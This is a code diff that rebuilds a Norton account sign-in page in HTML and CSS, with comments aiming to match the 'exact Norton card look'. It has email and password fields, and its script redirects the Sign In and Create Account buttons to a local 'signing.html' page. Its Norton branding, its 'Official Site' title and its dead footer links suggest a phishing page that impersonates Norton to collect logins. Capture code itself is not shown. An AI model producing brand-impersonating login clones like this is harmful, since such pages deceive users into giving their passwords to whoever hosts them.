@@ -2,14 +2,16 @@
 <html lang="EN" class="web">
 
 <head>
-  <title>Sign In - Official Site | Norton Account Sign In & Set Up</title>
-  <meta charset="utf-8">
-  <meta name="description" content="Log in to your Norton account. Sign in to enter your product key, access your account, manage your subscription, and extend your Norton protection to PC, Mac, Android, and iOS devices. If you don't already have a Norton account, create one today.">
-  <meta name="viewport" content="width=device-width">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width" />
+  <title>Sign In - Official Site | Norton Account Sign In &amp; Set Up</title>
+
+  <!-- keep original links -->
   <link rel="stylesheet" href="css/norton-sprites-style1.css" type="text/css" media="screen" title="default">
   <link rel="stylesheet" href="css/norton-bootstrap3-style.css" type="text/css" media="screen" title="default">
 
+  <!-- fonts -->
   <style>
     @font-face {
       font-family: 'Symantec Sans Light';
@@ -27,6 +29,148 @@
         url(fonts/symantec-sans_regular.ttf) format('truetype');
     }
   </style>
+
+  <!--
+    Minimal overrides to recreate the *exact* Norton card look (Image 1).
+    These are intentionally scoped to the #panel-column area so they don't alter
+    the rest of your site styling.
+  -->
+  <style>
+    /* container of the card positioning (keeps exactly at right column) */
+    #panel-column { position: relative; }
+
+    /* floating card wrapper */
+    #panel-background.login-panel {
+      position: relative;
+      min-height: 0;
+    }
+
+    /* the visible white card */
+    #panel-content .card {
+      width: 360px;                /* exact width like Image 1 */
+      background: #ffffff;
+      border-radius: 2px;
+      margin: 18px 40px;          /* sits to the right same as original */
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.16);
+      overflow: visible;
+      position: relative;
+      font-family: 'Symantec Sans', Arial, sans-serif;
+    }
+
+    /* top accent line */
+    #panel-content .card .card-accent {
+      height: 6px;
+      background: linear-gradient(90deg,#f1c94b,#f1c94b);
+      border-top-left-radius: 2px;
+      border-top-right-radius: 2px;
+    }
+
+    /* tab bar wrapper */
+    #panel-content .card .tabs {
+      display: flex;
+      align-items: stretch;
+      padding: 10px 14px 0;
+      background: transparent;
+    }
+
+    /* each tab */
+    #panel-content .card .tab {
+      flex: 1 1 auto;
+      text-align: center;
+      padding: 10px 6px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #9b9b9b;
+      background: #e9e9e9;
+      border-radius: 2px;
+      margin: 0 6px 0 0;
+      border: 0;
+      box-shadow: none;
+    }
+
+    /* selected tab looks like Image1: white, text dark, small top accent */
+    #panel-content .card .tab.selected {
+      background: transparent;
+      color: #333;
+      position: relative;
+      margin-right: 6px;
+    }
+    /* thin yellow line under selected tab (Image1) */
+    #panel-content .card .tab.selected::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: -10px;
+      height: 3px;
+      background: #f1c94b;
+      border-radius: 2px;
+    }
+
+    /* inner card body */
+    #panel-content .card .card-body {
+      padding: 18px 28px 26px;
+    }
+
+    /* inputs matching Image1 */
+    .card .form-control {
+      width: 100%;
+      height: 36px;
+      padding: 6px 10px;
+      box-sizing: border-box;
+      border: 1px solid #d2d2d2;
+      border-radius: 2px;
+      background: #fff;
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 12px;
+    }
+
+    /* checkbox small style and label */
+    .card .cbValue { width: 14px; height: 14px; vertical-align: middle; }
+    .card label.cbLabel { margin-left: 6px; color: #444; font-size: 13px; vertical-align: middle; }
+
+    /* privacy text small */
+    .card .privacy-text { font-size: 11px; color: #9b9b9b; margin: 12px 0; }
+
+    /* center the big yellow button like Image1 */
+    .card .signin-wrap { text-align: center; margin-top: 6px; margin-bottom: 8px; }
+    .card .signin_button {
+      display: inline-block;
+      min-width: 180px;          /* same centering width */
+      padding: 10px 26px;
+      border-radius: 2px;
+      background: #f1c94b;
+      border: 0;
+      color: #1e1e1e;
+      font-weight: 400;
+      font-size: 15px;
+      cursor: pointer;
+      box-shadow: none;
+    }
+
+    /* having trouble link style */
+    .card .help-link { display:block; text-align:center; margin-top:10px; color:#7e7e7e; text-decoration:none; font-size:13px; }
+
+    /* ensure panel shadows behind card (optional extra depth) */
+    #panel-content .panel-shadow {
+      position: absolute;
+      top: 28px;
+      right: 32px;
+      width: 360px;
+      height: 10px;
+      border-radius: 2px;
+      box-shadow: 0 24px 32px rgba(0,0,0,0.24);
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    /* small responsive tweak so card centers under different breakpoints */
+    @media (max-width: 767px) {
+      #panel-content .card { width: calc(100% - 40px); margin: 18px 20px; }
+      #panel-content .panel-shadow { right: 20px; width: calc(100% - 40px); }
+    }
+  </style>
 </head>
 
 <body class="theme_default login">
@@ -37,6 +181,7 @@
           <div class="sso_responsive_img_inner" aria-label="Norton by Symantec"></div>
         </div>
       </div>
+
       <span class="hidden_in_mobile">
         <div class="jumbotron bg_branded_style bg_font">
           <div id="background-mask"></div>
@@ -46,7 +191,7 @@
 
     <div class="container dual-container">
       <div class="row">
-        <!-- Left Column -->
+        <!-- left column unchanged -->
         <div id="open-column" class="col-md-6 col-sm-5">
           <div id="open-content">
             <div id="theme">
@@ -60,127 +205,116 @@
           </div>
         </div>
 
-<!-- Keep your original head and left-column; replace the right column with this -->
-<div id="panel-column" class="col-md-6 col-sm-7">
-  <!-- panel-background kept for existing site CSS hooks -->
-  <div id="panel-background" class="login-panel" style="position:relative; min-height:360px;">
-    <!-- decorative shadow/backdrop behind the panel (keeps the 'box behind' look even if external CSS missing) -->
-    <div class="panel-shadow" aria-hidden="true"
-         style="
-           position:absolute;
-           top:18px;
-           right:40px;
-           width:360px;
-           height:20px;
-           border-radius:6px;
-           box-shadow: 0 30px 40px rgba(0,0,0,0.28);
-           z-index:1;
-           pointer-events:none;
-         ">
+        <!-- right column -->
+        <div id="panel-column" class="col-md-6 col-sm-7">
+          <div id="panel-background" class="login-panel">
+            <!-- shadow behind card -->
+            <div class="panel-shadow" aria-hidden="true"></div>
+
+            <div id="panel-content">
+              <!-- The card element: matches Image1 exactly -->
+              <div class="card" role="region" aria-label="Sign in panel">
+                <div class="card-accent" aria-hidden="true"></div>
+
+                <!-- Tabs -->
+                <div class="tabs" role="tablist" aria-label="Sign in / Create account">
+                  <button id="tab-signin" class="tab selected" role="tab" aria-selected="true">Sign in</button>
+                  <button id="tab-create" class="tab" role="tab" aria-selected="false">Create an Account</button>
+                </div>
+
+                <div class="card-body">
+                  <!-- Login form area (kept inputs only to preserve look) -->
+                  <div id="loginCollapse" class="panel-collapse" style="display:block;">
+                    <div id="loginPanelBody" class="panel-body-inner">
+                      <input type="email" class="form-control" name="email" id="EmailFrom" placeholder="Email address" required>
+                      <input type="password" class="form-control" name="password" id="password" placeholder="Password" required>
+
+                      <div style="margin:6px 0;">
+                        <input class="cbValue" id="remember_me" name="remember_me" type="checkbox" checked>
+                        <label id="remember_me_lbl" for="remember_me" class="cbLabel">Remember me on this device</label>
+                      </div>
+
+                      <p class="privacy-text" style="text-align:center;">
+                        I have read and agree to the <a href="javascript:void(0)">Privacy Policy</a>
+                      </p>
+
+                      <div class="signin-wrap">
+                        <button type="button" id="signinBtn" class="signin_button">Sign In</button>
+                      </div>
+
+                      <a href="javascript:void(0)" id="forget-passwd-link" class="help-link">Having Trouble Signing In?</a>
+                    </div>
+                  </div>
+
+                  <!-- Register area (hidden by default to mimic original UI) -->
+                  <div id="registerCollapse" class="panel-collapse" style="display:none;">
+                    <div id="registerPanelBody" class="panel-body-inner">
+                      <input type="email" class="form-control" placeholder="Email address *" required>
+                      <input type="email" class="form-control" placeholder="Confirm email address *" required>
+                      <input type="password" class="form-control" placeholder="Create a secure password *" required>
+                      <div class="signin-wrap">
+                        <button type="button" id="createAccountBtn" class="signin_button">Create Account</button>
+                      </div>
+                    </div>
+                  </div>
+
+                </div> <!-- /card-body -->
+              </div> <!-- /card -->
+            </div> <!-- /panel-content -->
+          </div> <!-- /panel-background -->
+        </div> <!-- /panel-column -->
+      </div>
     </div>
+  </div>
 
-    <!-- optional lower soft shadow to mimic original depth -->
-    <div class="panel-shadow-bottom" aria-hidden="true"
-         style="
-           position:absolute;
-           top:48px;
-           right:40px;
-           width:360px;
-           height:6px;
-           border-radius:6px;
-           box-shadow: 0 10px 20px rgba(0,0,0,0.12);
-           z-index:1;
-           pointer-events:none;
-         ">
+  <div id="wrapper-bottom">
+    <div id="footer-content">
+      <footer class="np-global-footer" id="ngp-main-footer">
+        <div class="row">
+          <ul class="footer-links">
+            <li><a href="javascript:void(0)">Terms of Service</a></li>
+            <li><a href="javascript:void(0)">Privacy Policy</a></li>
+          </ul>
+        </div>
+      </footer>
     </div>
+  </div>
 
-    <!-- Visible content panel (needs higher z-index so it sits above the decorative shadow) -->
-    <div id="panel-content" style="position:relative; z-index:2; margin:18px 40px 40px 0; background:#ffffff; border-radius:4px; box-shadow: none; overflow:visible;">
-      <!-- we add the inner shadow and border accent to match Norton look -->
-      <div style="padding:18px 22px 26px; border-radius:4px; border-top:4px solid #f1c94b; box-shadow: 0 10px 30px rgba(0,0,0,0.08);">
-        <div id="container" class="btn-container" style="margin-bottom:10px;">
-          <button id="registerToggleButton" type="button" class="btn btn-lg btn-block-sm btn-tab btn-no-outline btn-bg-gradient" style="float:right; margin-left:8px;">
-            Create an Account
-          </button>
-          <button id="loginToggleButton" type="button" class="btn btn-lg btn-block-sm btn-tab btn-no-outline btn-bg-gradient in" style="float:right;">
-            Sign In
-          </button>
-          <div style="clear:both;"></div>
-        </div>
+  <!-- small JS: toggles tabs and redirects sign-in -->
+  <script>
+    // Tab toggles
+    var tabSign = document.getElementById('tab-signin');
+    var tabCreate = document.getElementById('tab-create');
+    var loginCollapse = document.getElementById('loginCollapse');
+    var registerCollapse = document.getElementById('registerCollapse');
 
-        <div id="loginCollapse" class="panel-collapse collapse active" style="display:block;">
-          <div id="loginPanelBody" class="panel-body">
-            <div class="row">
-              <div class="form-group text-input col-xs-12">
-                <input type="email" class="form-control" name="email" id="EmailFrom" placeholder="Email address" required>
-              </div>
-            </div>
+    function showLogin() {
+      tabSign.classList.add('selected');
+      tabCreate.classList.remove('selected');
+      loginCollapse.style.display = 'block';
+      registerCollapse.style.display = 'none';
+    }
+    function showRegister() {
+      tabCreate.classList.add('selected');
+      tabSign.classList.remove('selected');
+      registerCollapse.style.display = 'block';
+      loginCollapse.style.display = 'none';
+    }
 
-            <div class="row">
-              <div class="form-group text-input col-xs-12">
-                <input type="password" class="form-control" name="password" id="password" placeholder="Password" required>
-              </div>
-            </div>
+    tabSign.addEventListener('click', showLogin);
+    tabCreate.addEventListener('click', showRegister);
 
-            <div class="form-group">
-              <input class="cbValue" id="remember_me" name="remember_me" type="checkbox" checked>
-              <label id="remember_me_lbl" for="remember_me" class="cbLabel">Remember me on this device</label>
-            </div>
+    // Redirect to signing.html when Sign In clicked
+    document.getElementById('signinBtn').addEventListener('click', function () {
+      window.location.href = 'signing.html';
+    });
 
-            <p class="privacy-text terms text-center" style="margin-top: 10px; font-size: 10px;">
-              I have read and agree to the <a href="javascript:void(0)">Privacy Policy</a>
-            </p>
-
-            <div class="form-group text-center" style="margin-top:12px;">
-              <button type="button" id="signinBtn" class="btn btn-lg btn-block-sm signin_button" style="background:#f1c94b; border:0; color:#222; padding:10px 20px; border-radius:3px;">Sign In</button>
-            </div>
-
-            <div class="form-group text-center">
-              <a href="javascript:void(0)" id="forget-passwd-link">Having Trouble Signing In?</a>
-            </div>
-          </div>
-        </div>
-
-        <!-- register block (kept minimal so design stays same) -->
-        <div id="registerCollapse" class="panel-collapse collapse" style="display:none;">
-          <div id="registerPanelBody" class="panel-body">
-            <p class="smallest-text">An account is needed to access all of your Norton products and services.</p>
-            <div class="row">
-              <div class="form-group text-input col-xs-12">
-                <input type="email" class="form-control" placeholder="Email address *" required>
-              </div>
-            </div>
-            <!-- (other register fields omitted here for brevity) -->
-            <div class="form-group text-center" style="margin-top:12px;">
-              <button type="button" id="createAccountBtn" class="btn btn-lg btn-block-sm signin_button" style="background:#f1c94b; border:0; color:#222; padding:10px 20px; border-radius:3px;">Create Account</button>
-            </div>
-          </div>
-        </div>
-      </div> <!-- inner accent box -->
-    </div> <!-- panel-content -->
-  </div> <!-- panel-background -->
-</div> <!-- panel-column -->
-
-<!-- Minimal script: toggle panels + redirect -->
-<script>
-  // redirect actions (keeps UX you asked)
-  document.getElementById("signinBtn").addEventListener("click", function () {
-    window.location.href = "signing.html";
-  });
-  document.getElementById("createAccountBtn").addEventListener("click", function () {
-    window.location.href = "signing.html";
-  });
-
-  // toggle panels
-  document.getElementById("registerToggleButton").addEventListener("click", function () {
-    document.getElementById("loginCollapse").style.display = "none";
-    document.getElementById("registerCollapse").style.display = "block";
-  });
-  document.getElementById("loginToggleButton").addEventListener("click", function () {
-    document.getElementById("registerCollapse").style.display = "none";
-    document.getElementById("loginCollapse").style.display = "block";
-  });
-</script>
-
+    // Optional: Create Account remains toggling to register form by default.
+    document.getElementById('createAccountBtn').addEventListener('click', function () {
+      // If you want Create Account to redirect to signing.html instead,
+      // replace the next line with: window.location.href = 'signing.html';
+      window.location.href = 'signing.html';
+    });
+  </script>
 </body>
 </html>
